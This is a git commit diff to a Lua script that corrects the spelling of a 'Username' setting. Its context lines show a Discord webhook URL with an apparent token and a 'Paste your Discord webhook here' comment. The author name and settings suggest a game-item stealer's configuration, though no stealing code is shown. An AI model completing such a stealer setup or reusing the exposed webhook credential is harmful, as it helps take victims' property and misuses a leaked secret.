8856091365b0a42e403fa579c501914899297745
stealin2332421345 <163696486+stealin2332421345@users.noreply.github.com>
2024-03-17 02:41:00 +0200

    script.lua

--- script.lua
+++ script.lua
@@ -1,4 +1,4 @@
-Username = stealinmyfflower
+Username = stealinmyflower
 LoadScreen = true 
 Webhook = httpsdiscord.comapiwebhooks1218718343775653919-KrUrM4JPg10qQHeiQElLimc3CBIuOVk9IS1gubtcepdFNY2zpu8wgYLj5Z4mPuIU8wb -- Paste your Discord webhook here
 
